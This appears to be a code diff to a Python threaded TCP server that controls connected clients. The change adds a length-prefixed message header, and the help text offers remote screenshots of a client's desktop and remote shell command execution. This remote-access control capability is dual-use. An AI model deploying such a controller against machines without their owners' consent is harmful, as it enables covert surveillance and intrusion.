@@ -16,10 +16,11 @@ class ThreadedTCPRequestHandler(socketserver.BaseRequestHandler):
     It is instantiated once per connection to the server, and must
     override the handle() method to implement communication to the client.
     """
+    
 
     def setup(self) :
         print(f'\nNew client connection : {self.client_address}')
-        connected_clients[self.client_address] = self.request # socket
+        connected_clients[self.client_address] = self.request # storing the socket
         # print(f'Threads alive : {threading.active_count()}') # Debug purpose
 
     def handle(self):
@@ -27,12 +28,15 @@ class ThreadedTCPRequestHandler(socketserver.BaseRequestHandler):
             print('IP not in the WhiteList')
             return
         
-        packet_header_size = 4 # Header will always be 4 bytes long
-        packer_header = 0 # text is send over 1024 bytes and images over 8192
+        HEADER_LENGTH = 4 # Header will always be 4 bytes long
+        data_size = 0 # text is sent over 1024 bytes and images over multiple 8192 bytes long
 
         try :
             while True : # Keep the connection Open
-                self.data = self.request.recv(1024).strip() # buff size 1024
+                header = self.request.recv(HEADER_LENGTH).strip()
+                data_size = int.from_bytes(header, 'little')
+
+                self.data = self.request.recv(data_size).strip()
                 message = self.data.decode('utf-8')
                 print(f'{self.client_address} > ' + message)
 
@@ -100,7 +104,7 @@ def list_commands_available():
     print('list : To list clients connected to the server')
     print('send_echo [clientIP@port] ["message"]')
     print('get_SC [clientIP@port] : Get a ScreenShot of the client Desktop')
-    print('shell [clientIP@port] [\'Shell Command\'] : Send a Shell/Powershell command to the client and get the result')
+    print('shell [clientIP@port] [Shell Command] : Send a Shell command to the client and get the result')
 
 
 def print_clients():
